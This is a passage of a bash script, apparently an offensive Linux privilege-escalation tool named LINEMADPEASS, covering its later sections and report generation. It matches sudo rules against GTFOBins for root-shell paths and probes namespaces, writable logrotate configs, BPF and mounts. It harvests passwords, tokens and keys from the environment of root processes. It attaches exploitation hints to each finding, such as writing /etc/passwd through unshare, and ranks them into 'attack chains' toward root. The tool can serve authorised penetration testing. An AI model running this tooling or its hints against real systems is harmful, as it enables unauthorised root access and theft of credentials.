[ "$PERSIST_SCORE" -ge 20 ] && add_attack_chain "PERSIST: Multiple persistence vectors ($PERSIST_SCORE pts) — establish backdoor then privesc"

################################################################################
# 40. GTFOBINS SUDO LIVE MATCHER (UNIQUE)
################################################################################
progress "GTFOBins Sudo Matcher"
section "40. GTFOBINS LIVE SUDO MATCHER"

if command -v sudo >/dev/null 2>&1; then
    SUDO_L=$(sudo -l 2>/dev/null)
    if echo "$SUDO_L" | grep -q "may run"; then
        info "Cross-referencing sudo rules with GTFOBins database..."
        for gtfobin in "${!GTFOBINS_EXPLOIT[@]}"; do
            if echo "$SUDO_L" | grep -qiE "(NOPASSWD|ALL).*$gtfobin|$gtfobin.*NOPASSWD"; then
                match_gtfobins "$gtfobin" "sudo"
                add_attack_chain "SUDO→ROOT: sudo $gtfobin (GTFOBins) → immediate root shell"
            fi
        done
    fi
fi

################################################################################
# 41. NFS / CIFS CLIENT ABUSE (UNIQUE)
################################################################################
progress "NFS/CIFS Client Abuse"
section "41. NFS/CIFS CLIENT-SIDE ABUSE"

# NFS mounts with nosuid/noexec disabled
mount | grep -E "type nfs|type cifs" 2>/dev/null | while read -r mline; do
    log "  $mline"
    if echo "$mline" | grep -q "nfs" && ! echo "$mline" | grep -q "nosuid"; then
        finding_warning "NFS Mount Without nosuid" "$mline" "T1570" "Place SUID binary on NFS share" "nfs_client"
    fi
    if echo "$mline" | grep -q "cifs" && ! echo "$mline" | grep -q "noexec"; then
        finding_warning "CIFS Mount Without noexec" "$mline" "T1570" "Execute payloads from CIFS share" "cifs"
    fi
done

# Check /etc/fstab for misconfigs
if [ -r /etc/fstab ]; then
    FSTAB_ISSUES=$(grep -v "^#" /etc/fstab 2>/dev/null | grep -E "user|nosuid|noexec" || true)
    grep -v "^#" /etc/fstab 2>/dev/null | while read -r fstab_line; do
        if echo "$fstab_line" | grep -qv "nosuid" && echo "$fstab_line" | grep -qE "nfs|cifs"; then
            warning "fstab NFS/CIFS without nosuid: $fstab_line"
        fi
    done
fi

################################################################################
# 42. SUBUID/SUBGID & USER NAMESPACE ABUSE (UNIQUE)
################################################################################
progress "Subuid/Subgid Abuse"
section "42. SUBUID/SUBGID & USER NAMESPACE ABUSE"

if [ -r /etc/subuid ] && [ -r /etc/subgid ]; then
    MY_SUBUID=$(grep "^$(whoami):" /etc/subuid 2>/dev/null)
    MY_SUBGID=$(grep "^$(whoami):" /etc/subgid 2>/dev/null)
    if [ -n "$MY_SUBUID" ]; then
        info "subuid entry: $MY_SUBUID"
        SUBUID_RANGE=$(echo "$MY_SUBUID" | cut -d: -f2-3)
        finding_warning "Subuid Mapping Available" "Range: $SUBUID_RANGE — newuidmap abuse possible" \
            "T1068" "unshare -Ur → write /etc/passwd via mapped root" "subuid"
    fi
fi

# unprivileged user namespace check
if sysctl -n kernel.unprivileged_userns_clone 2>/dev/null | grep -q "1"; then
    if unshare -Urn true 2>/dev/null; then
        finding_warning "Unprivileged User Namespace Works" "CAN create user namespaces" \
            "T1068" "unshare -Ur id (should show uid=0 in ns)" "userns_escape"
        add_attack_chain "USERNS→ROOT: unshare user namespace → map root UID → write /etc/passwd on misconfigured FS"
    fi
fi

################################################################################
# 43. LOG / JOURNAL POISONING (UNIQUE)
################################################################################
progress "Log Poisoning Vectors"
section "43. LOG & JOURNAL POISONING VECTORS"

# Writable log files executed by root
find /var/log -maxdepth 2 -type f -writable 2>/dev/null | head -15 | while read -r logfile; do
    finding_warning "Writable Log File" "$logfile — log poisoning if processed by root" \
        "T1037" "Inject PHP/code if log consumed by web server" "log_poison"
done

# journald remote
if [ -w /etc/systemd/journald.conf ] 2>/dev/null; then
    finding_critical "Writable journald.conf" "Modify journald for code execution" "T1037" "Add ForwardToSocket or inject" "journald"
fi

# logrotate writable
find /etc/logrotate.d -type f -writable 2>/dev/null | while read -r lr; do
    finding_critical "Writable logrotate config" "$lr" "T1037" "Add 'create' directive with malicious script" "logrotate"
    add_attack_chain "LOGROTATE→ROOT: Writable logrotate → postrotate exec → root when cron runs logrotate"
done

################################################################################
# 44. PROCESS MEMORY & SECRETS IN RAM (UNIQUE)
################################################################################
progress "Process Memory Secrets"
section "44. PROCESS MEMORY & RUNTIME SECRETS"

info "Checking readable process memory maps (secrets in RAM)..."
PROC_CHECKED=0
for proc_dir in /proc/[0-9]*; do
    [ "$PROC_CHECKED" -ge 5 ] && break
    pid=$(basename "$proc_dir" 2>/dev/null)
    owner=$(stat -c %U "$proc_dir" 2>/dev/null)
    if [ "$owner" = "root" ] && [ -r "$proc_dir/environ" ] 2>/dev/null; then
        ENV_SECRETS=$(tr '\0' '\n' < "$proc_dir/environ" 2>/dev/null | grep -iE "password|secret|token|key|api" | head -3)
        if [ -n "$ENV_SECRETS" ]; then
            finding_critical "Root Process Env Secrets" "PID $pid readable — credentials in environment" \
                "T1552.001" "cat /proc/$pid/environ | tr '\\0' '\\n' | grep -i pass" "proc_env"
            PROC_CHECKED=$((PROC_CHECKED + 1))
        fi
    fi
done 2>/dev/null

# Shared memory segments
if command -v ipcs >/dev/null 2>&1; then
    SHM=$(ipcs -m 2>/dev/null | tail -n +4 | head -10)
    if [ -n "$SHM" ]; then
        info "Shared memory segments:"
        echo "$SHM" | tee -a "$OUTPUT_FILE"
    fi
fi

################################################################################
# 45. eBPF / BPF SUBSYSTEM (UNIQUE)
################################################################################
progress "eBPF Subsystem"
section "45. eBPF / BPF PRIVILEGE ANALYSIS"

if [ -d /sys/fs/bpf ]; then
    info "BPF filesystem mounted at /sys/fs/bpf"
    ls -la /sys/fs/bpf 2>/dev/null | head -10 | tee -a "$OUTPUT_FILE"
fi

BPF_DISABLED=$(sysctl -n kernel.unprivileged_bpf_disabled 2>/dev/null)
if [ "$BPF_DISABLED" = "0" ] || [ "$BPF_DISABLED" = "2" ]; then
    finding_warning "Unprivileged BPF Enabled" "kernel.unprivileged_bpf_disabled=$BPF_DISABLED" \
        "T1068" "CVE-2022-23222 — BPF LPE via user namespaces" "bpf_lpe"
fi

if [ -r /proc/kallsyms ] 2>/dev/null; then
    finding_warning "kallsyms Readable" "/proc/kallsyms readable — KASLR defeat" "T1068" "cat /proc/kallsyms | grep commit_creds" "kaslr"
fi

################################################################################
# 46. SNAP / FLATPAK PRIVILEGE ESCAPE (UNIQUE)
################################################################################
progress "Snap/Flatpak Escape"
section "46. SNAP & FLATPAK ESCAPE VECTORS"

if command -v snap >/dev/null 2>&1; then
    info "Snap packages installed:"
    snap list 2>/dev/null | tee -a "$OUTPUT_FILE"
    # Classic snap confinement bypass
    snap list 2>/dev/null | grep -v "Notes" | while read -r snap_name ver rev channel publisher; do
        SNAP_INFO=$(snap info "$snap_name" 2>/dev/null)
        if echo "$SNAP_INFO" | grep -q "confinement.*classic"; then
            finding_warning "Classic Snap: $snap_name" "Classic confinement = full system access" "T1543" "snap run $snap_name" "snap"
        fi
    done 2>/dev/null
fi

if command -v flatpak >/dev/null 2>&1; then
    info "Flatpak applications:"
    flatpak list 2>/dev/null | tee -a "$OUTPUT_FILE"
    if flatpak list --columns=application,permissions 2>/dev/null | grep -q "filesystem=host"; then
        finding_warning "Flatpak Host FS Access" "App has filesystem=host permission" "T1543" "flatpak run --filesystem=host" "flatpak"
    fi
fi

################################################################################
# 47. ATTACK CHAIN SYNTHESIZER (UNIQUE — NO OTHER TOOL HAS THIS)
################################################################################
progress "Attack Chain Synthesizer"
section "47. ATTACK CHAIN SYNTHESIZER"

echo -e "${MAGENTA}"
echo "╔══════════════════════════════════════════════════════════════════════╗"
echo "║          AUTOMATIC ATTACK PATH SYNTHESIS — LINEMADPEASS EXCLUSIVE    ║"
echo "╚══════════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Auto-generate chains from registered findings
for i in "${!FINDINGS_CHAIN_TAG[@]}"; do
    tag="${FINDINGS_CHAIN_TAG[$i]}"
    title="${FINDINGS_TITLE[$i]}"
    exploit="${FINDINGS_EXPLOIT[$i]}"
    case "$tag" in
        gtfobins_*|docker_*|docker_socket|docker_group)
            add_attack_chain "AUTO→ROOT: ${title} → ${exploit:-see exploit file}"
            ;;
        cloud_*)
            add_attack_chain "AUTO→CLOUD: ${title} → pivot to cloud admin"
            ;;
        k8s_*|container*|containerd|podman*)
            add_attack_chain "AUTO→CONTAINER ESCAPE: ${title}"
            ;;
        writable_*|cron*|systemd*|logrotate|core_pattern|acl)
            add_attack_chain "AUTO→ROOT: ${title} → wait for root execution"
            ;;
        kernel_cve|pwnkit|bpf*|userns*|subuid)
            add_attack_chain "AUTO→ROOT: ${title} → kernel/MAC bypass exploit"
            ;;
    esac
done

# Deduplicate and rank chains
declare -A CHAIN_SEEN
CHAIN_NUM=0
echo "" | tee -a "$CHAIN_FILE"
log_exploit "ATTACK CHAIN SYNTHESIS REPORT"
log_exploit "Generated: $(date)"
log_exploit ""

if [ ${#ATTACK_CHAINS[@]} -eq 0 ]; then
    info "No automatic attack chains synthesized — review individual findings"
else
    # Sort by priority (CLOUD/CONTAINER/SUDO first)
    for chain in "${ATTACK_CHAINS[@]}"; do
        [ -z "$chain" ] && continue
        CHAIN_HASH=$(echo "$chain" | md5sum 2>/dev/null | cut -d' ' -f1 || echo "$chain")
        [ -n "${CHAIN_SEEN[$CHAIN_HASH]}" ] && continue
        CHAIN_SEEN[$CHAIN_HASH]=1
        CHAIN_NUM=$((CHAIN_NUM + 1))

        PRIORITY="MEDIUM"
        echo "$chain" | grep -qE "SUDO→ROOT|docker|GTFOBins|core_pattern|writable.*passwd" && PRIORITY="CRITICAL"
        echo "$chain" | grep -qE "CLOUD|K8S|CONTAINER" && PRIORITY="HIGH"

        case "$PRIORITY" in
            CRITICAL) COLOR=$BRIGHT_RED ;;
            HIGH)     COLOR=$YELLOW ;;
            *)        COLOR=$CYAN ;;
        esac

        echo -e "${COLOR}  [Chain #$CHAIN_NUM] [$PRIORITY] $chain${NC}"
        log_exploit "[$PRIORITY] Chain #$CHAIN_NUM: $chain"
    done
    success "Synthesized $CHAIN_NUM unique attack path(s) → $CHAIN_FILE"
fi

################################################################################
# 48. MITRE ATT&CK MAPPING (UNIQUE)
################################################################################
progress "MITRE ATT&CK Mapping"
section "48. MITRE ATT&CK TECHNIQUE MAPPING"

declare -A MITRE_COUNT
echo "" | tee -a "$MITRE_FILE"
log "MITRE ATT&CK MAPPING"
log "═══════════════════════════════════════════════════════════════════════"

for i in "${!FINDINGS_MITRE[@]}"; do
    mitre="${FINDINGS_MITRE[$i]}"
    title="${FINDINGS_TITLE[$i]}"
    sev="${FINDINGS_SEVERITY[$i]}"
    [ -z "$mitre" ] && continue
    MITRE_COUNT[$mitre]=$((${MITRE_COUNT[$mitre]:-0} + 1))
    log "  [$sev] $mitre — $title"
done

echo -e "${CYAN}MITRE ATT&CK Technique Summary:${NC}"
for technique in "${!MITRE_COUNT[@]}"; do
    count="${MITRE_COUNT[$technique]}"
    echo -e "  ${YELLOW}$technique${NC}: $count finding(s)"
    echo "  $technique: $count" >> "$MITRE_FILE"
done

################################################################################
# EXPORT: JSON & HTML REPORTS (UNIQUE)
################################################################################
generate_json_report() {
    {
        echo "{"
        echo "  \"tool\": \"linemadpeass\","
        echo "  \"version\": \"$VERSION\","
        echo "  \"scan_date\": \"$(date -Iseconds 2>/dev/null || date)\","
        echo "  \"hostname\": \"$(hostname)\","
        echo "  \"user\": \"$(whoami)\","
        echo "  \"kernel\": \"$(uname -r)\","
        echo "  \"mode\": \"$MODE\","
        echo "  \"risk_score\": $RISK_SCORE,"
        echo "  \"statistics\": {"
        echo "    \"critical\": $CRITICAL_COUNT,"
        echo "    \"warnings\": $WARNING_COUNT,"
        echo "    \"info\": $INFO_COUNT,"
        echo "    \"suid\": $SUID_COUNT,"
        echo "    \"writable\": $WRITABLE_COUNT,"
        echo "    \"kernel_vulns\": $KERNEL_VULN_COUNT,"
        echo "    \"persistence_score\": ${PERSIST_SCORE:-0}"
        echo "  },"
        echo "  \"findings\": ["
        local first=1
        for i in "${!FINDINGS_IDS[@]}"; do
            [ "$first" -eq 0 ] && echo ","
            first=0
            id="${FINDINGS_IDS[$i]}"
            sev="${FINDINGS_SEVERITY[$i]}"
            title="${FINDINGS_TITLE[$i]}"
            detail="${FINDINGS_DETAIL[$i]}"
            mitre="${FINDINGS_MITRE[$i]}"
            exploit="${FINDINGS_EXPLOIT[$i]}"
            title_esc=$(echo "$title" | sed 's/"/\\"/g')
            detail_esc=$(echo "$detail" | sed 's/"/\\"/g')
            exploit_esc=$(echo "$exploit" | sed 's/"/\\"/g')
            echo -n "    {\"id\":\"$id\",\"severity\":\"$sev\",\"title\":\"$title_esc\",\"detail\":\"$detail_esc\",\"mitre\":\"$mitre\",\"exploit\":\"$exploit_esc\"}"
        done
        echo ""
        echo "  ],"
        echo "  \"attack_chains\": ["
        first=1
        for chain in "${ATTACK_CHAINS[@]}"; do
            [ -z "$chain" ] && continue
            [ "$first" -eq 0 ] && echo ","
            first=0
            chain_esc=$(echo "$chain" | sed 's/"/\\"/g')
            echo -n "    \"$chain_esc\""
        done
        echo ""
        echo "  ]"
        echo "}"
    } > "$JSON_FILE"
}

generate_html_report() {
    local risk_color="#22c55e"
    [ "$RISK_SCORE" -gt 30 ] && risk_color="#eab308"
    [ "$RISK_SCORE" -gt 60 ] && risk_color="#f97316"
    [ "$RISK_SCORE" -gt 80 ] && risk_color="#ef4444"

    cat > "$HTML_FILE" << HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LINEMADPEASS Report — $(hostname)</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'Segoe UI',system-ui,sans-serif;background:#0f172a;color:#e2e8f0;line-height:1.6}
  .header{background:linear-gradient(135deg,#1e1b4b,#312e81);padding:2rem;text-align:center;border-bottom:2px solid #6366f1}
  .header h1{font-size:2rem;background:linear-gradient(90deg,#818cf8,#c084fc);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
  .header p{color:#94a3b8;margin-top:.5rem}
  .risk-gauge{display:flex;justify-content:center;padding:2rem}
  .gauge{width:180px;height:180px;border-radius:50%;border:8px solid ${risk_color};display:flex;align-items:center;justify-content:center;flex-direction:column;background:#1e293b}
  .gauge .score{font-size:3rem;font-weight:700;color:${risk_color}}
  .gauge .label{font-size:.8rem;color:#94a3b8}
  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:1rem;padding:1rem 2rem;max-width:1200px;margin:0 auto}
  .stat-card{background:#1e293b;border-radius:12px;padding:1.2rem;text-align:center;border:1px solid #334155}
  .stat-card .num{font-size:2rem;font-weight:700}
  .stat-card .lbl{color:#94a3b8;font-size:.85rem}
  .critical .num{color:#ef4444}.warning .num{color:#eab308}.info .num{color:#3b82f6}
  .section{max-width:1200px;margin:2rem auto;padding:0 2rem}
  .section h2{color:#818cf8;border-bottom:1px solid #334155;padding-bottom:.5rem;margin-bottom:1rem}
  .finding{background:#1e293b;border-radius:8px;padding:1rem;margin:.5rem 0;border-left:4px solid #6366f1}
  .finding.critical{border-left-color:#ef4444}
  .finding.warning{border-left-color:#eab308}
  .finding .title{font-weight:600}
  .finding .meta{color:#94a3b8;font-size:.85rem;margin-top:.3rem}
  .chain{background:#1e1b4b;border:1px solid #4338ca;border-radius:8px;padding:1rem;margin:.5rem 0}
  .chain .priority{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.75rem;font-weight:600;margin-bottom:.5rem}
  .priority-CRITICAL{background:#ef444433;color:#ef4444}
  .priority-HIGH{background:#eab30833;color:#eab308}
  .priority-MEDIUM{background:#3b82f633;color:#3b82f6}
  footer{text-align:center;padding:2rem;color:#64748b;border-top:1px solid #334155;margin-top:2rem}
</style>
</head>
<body>
<div class="header">
  <h1>LINEMADPEASS v${VERSION}</h1>
  <p>$(hostname) — $(whoami) — $(uname -r) — $(date)</p>
</div>
<div class="risk-gauge">
  <div class="gauge">
    <div class="score">${RISK_SCORE}</div>
    <div class="label">NEURAL RISK SCORE</div>
  </div>
</div>
<div class="stats">
  <div class="stat-card critical"><div class="num">${CRITICAL_COUNT}</div><div class="lbl">Critical</div></div>
  <div class="stat-card warning"><div class="num">${WARNING_COUNT}</div><div class="lbl">Warnings</div></div>
  <div class="stat-card info"><div class="num">${INFO_COUNT}</div><div class="lbl">Info</div></div>
  <div class="stat-card"><div class="num">${PERSIST_SCORE:-0}</div><div class="lbl">Persistence Score</div></div>
  <div class="stat-card"><div class="num">${#ATTACK_CHAINS[@]}</div><div class="lbl">Attack Chains</div></div>
</div>
<div class="section">
  <h2>Attack Chains</h2>
HTMLEOF

    local cn=0
    for chain in "${ATTACK_CHAINS[@]}"; do
        [ -z "$chain" ] && continue
        cn=$((cn + 1))
        PRIORITY="MEDIUM"
        echo "$chain" | grep -qE "SUDO→ROOT|docker|GTFOBins|core_pattern" && PRIORITY="CRITICAL"
        echo "$chain" | grep -qE "CLOUD|K8S|CONTAINER" && PRIORITY="HIGH"
        chain_html=$(echo "$chain" | sed 's/</\&lt;/g; s/>/\&gt;/g')
        echo "  <div class=\"chain\"><span class=\"priority priority-${PRIORITY}\">${PRIORITY}</span><div>Chain #${cn}: ${chain_html}</div></div>" >> "$HTML_FILE"
    done

    cat >> "$HTML_FILE" << HTMLEOF2
</div>
<div class="section">
  <h2>Findings (${FINDING_ID})</h2>
HTMLEOF2

    for i in "${!FINDINGS_IDS[@]}"; do
        id="${FINDINGS_IDS[$i]}"
        sev="${FINDINGS_SEVERITY[$i]}"
        title="${FINDINGS_TITLE[$i]}"
        mitre="${FINDINGS_MITRE[$i]}"
        title_html=$(echo "$title" | sed 's/</\&lt;/g; s/>/\&gt;/g')
        echo "  <div class=\"finding ${sev}\"><div class=\"title\">[${id}] ${title_html}</div><div class=\"meta\">${sev} | MITRE: ${mitre}</div></div>" >> "$HTML_FILE"
    done

    cat >> "$HTML_FILE" << HTMLEOF3
</div>
<footer>LINEMADPEASS v${VERSION} — MadExploits — Mode: ${MODE}</footer>
</body>
</html>
HTMLEOF3
}

# Generate reports based on format
case "$OUTPUT_FORMAT" in
    json|all) generate_json_report; info "JSON report: $JSON_FILE" ;;
esac
case "$OUTPUT_FORMAT" in
    html|all) generate_html_report; info "HTML dashboard: $HTML_FILE" ;;
esac

################################################################################
# 49. SUMMARY AND RECOMMENDATIONS
################################################################################
progress "Final Summary"
section "49. SUMMARY AND RECOMMENDATIONS"

SCAN_END=$(date +%s)
SCAN_DURATION=$((SCAN_END - SCAN_START))

echo ""
echo -e "${BRIGHT_GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_GREEN}║              ENUMERATION COMPLETE — LINEMADPEASS v${VERSION}              ║${NC}"
echo -e "${BRIGHT_GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Neural Risk Score gauge
RISK_COLOR=$GREEN
[ "$RISK_SCORE" -gt 30 ] && RISK_COLOR=$YELLOW
[ "$RISK_SCORE" -gt 60 ] && RISK_COLOR=$BRIGHT_RED
echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║                    NEURAL RISK SCORE                                  ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${RISK_COLOR}█████ ${RISK_SCORE}/100 █████${NC}  $( [ "$RISK_SCORE" -gt 80 ] && echo "CRITICAL RISK" || ([ "$RISK_SCORE" -gt 50 ] && echo "HIGH RISK" || ([ "$RISK_SCORE" -gt 20 ] && echo "MEDIUM RISK" || echo "LOW RISK")) )"
echo ""

# Display statistics
echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║                    VULNERABILITY STATISTICS                           ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BRIGHT_RED}  [!!!] Critical Vulnerabilities: ${CRITICAL_COUNT}${NC}"
echo -e "${YELLOW}  [!] Warnings Found: ${WARNING_COUNT}${NC}"
echo -e "${BLUE}  [*] Info Findings: ${INFO_COUNT}${NC}"
echo -e "${BLUE}  [*] Structured Findings: ${FINDING_ID}${NC}"
echo -e "${BLUE}  [*] Exploitable SUID Binaries: ${SUID_COUNT}${NC}"
echo -e "${BLUE}  [*] Writable Files/Directories: ${WRITABLE_COUNT}${NC}"
echo -e "${BLUE}  [*] Kernel Vulnerabilities: ${KERNEL_VULN_COUNT}${NC}"
echo -e "${MAGENTA}  [⛓] Attack Chains Synthesized: ${#ATTACK_CHAINS[@]}${NC}"
echo -e "${MAGENTA}  [🔒] Persistence Score: ${PERSIST_SCORE:-0}/100${NC}"
echo -e "${GRAY}  [⏱] Scan Duration: ${SCAN_DURATION}s${NC}"
echo ""

# Risk assessment
TOTAL_VULN=$((CRITICAL_COUNT + WARNING_COUNT))
if [ "$TOTAL_VULN" -eq 0 ]; then
    echo -e "${GREEN}  ✓ No obvious vulnerabilities detected (but always verify manually)${NC}"
elif [ "$CRITICAL_COUNT" -gt 5 ]; then
    echo -e "${BRIGHT_RED}  ⚠ HIGH RISK: Multiple critical vulnerabilities detected!${NC}"
elif [ "$CRITICAL_COUNT" -gt 0 ]; then
    echo -e "${YELLOW}  ⚠ MEDIUM RISK: Critical vulnerabilities detected${NC}"
else
    echo -e "${GREEN}  ✓ LOW RISK: Only warnings detected${NC}"
fi
echo ""

info "Report saved to: $OUTPUT_FILE"
info "Exploit methods saved to: $EXPLOIT_FILE"
info "Attack chains saved to: $CHAIN_FILE"
info "MITRE mapping saved to: $MITRE_FILE"
[ -f "$JSON_FILE" ] && info "JSON report: $JSON_FILE"
[ -f "$HTML_FILE" ] && info "HTML dashboard: $HTML_FILE"

log ""
log "═══════════════════════════════════════════════════════════════════════"
log "VULNERABILITY STATISTICS"
log "═══════════════════════════════════════════════════════════════════════"
log "Neural Risk Score: $RISK_SCORE/100"
log "Critical Vulnerabilities: $CRITICAL_COUNT"
log "Warnings: $WARNING_COUNT"
log "Info: $INFO_COUNT"
log "Structured Findings: $FINDING_ID"
log "Exploitable SUID Binaries: $SUID_COUNT"
log "Writable Files/Directories: $WRITABLE_COUNT"
log "Kernel Vulnerabilities: $KERNEL_VULN_COUNT"
log "Attack Chains: ${#ATTACK_CHAINS[@]}"
log "Persistence Score: ${PERSIST_SCORE:-0}/100"
log "Scan Duration: ${SCAN_DURATION}s"
log ""

echo ""
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}                    NEXT STEPS & RECOMMENDATIONS                        ${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════════════${NC}"
echo ""

warning "1. Review attack chains FIRST: $CHAIN_FILE"
warning "2. Open HTML dashboard for visual overview: ${HTML_FILE:-run with -f html}"
warning "3. Review exploit methods: $EXPLOIT_FILE"
warning "4. Check MITRE ATT&CK mapping: $MITRE_FILE"
warning "5. Research kernel exploits for: $(uname -r)"
warning "6. Test GTFOBins matches from section 40"
warning "7. Verify cloud metadata exposure (section 33)"
warning "8. Test container escape vectors (section 34)"
warning "9. Check persistence vectors (score: ${PERSIST_SCORE:-0})"
warning "10. Export JSON for automation: ${JSON_FILE:-run with -f json}"

echo ""
echo -e "${CYAN}Unique LINEMADPEASS Features:${NC}"
echo -e "  • Neural Risk Score (0-100) with weighted exploitability"
echo -e "  • Attack Chain Synthesizer — multi-step paths to root"
echo -e "  • MITRE ATT&CK technique mapping per finding"
echo -e "  • GTFOBins live matcher (80+ binaries)"
echo -e "  • Cloud metadata escape (AWS/GCP/Azure/DO)"
echo -e "  • Container Trinity (Docker/Podman/K8s/containerd)"
echo -e "  • Package-to-CVE correlator"
echo -e "  • Interactive HTML dashboard"
echo ""
echo -e "${CYAN}Useful Resources:${NC}"
echo -e "  • GTFOBins: https://gtfobins.github.io"
echo -e "  • Exploit-DB: https://www.exploit-db.com"
echo -e "  • MITRE ATT&CK: https://attack.mitre.org"
echo -e "  • Linux Kernel Exploits: https://github.com/SecWiki/linux-kernel-exploits"
echo ""

echo -e "${BRIGHT_GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_GREEN}║  Scan completed! Risk: ${RISK_SCORE}/100 | Chains: ${#ATTACK_CHAINS[@]} | ${SCAN_DURATION}s          ║${NC}"
echo -e "${BRIGHT_GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
echo ""
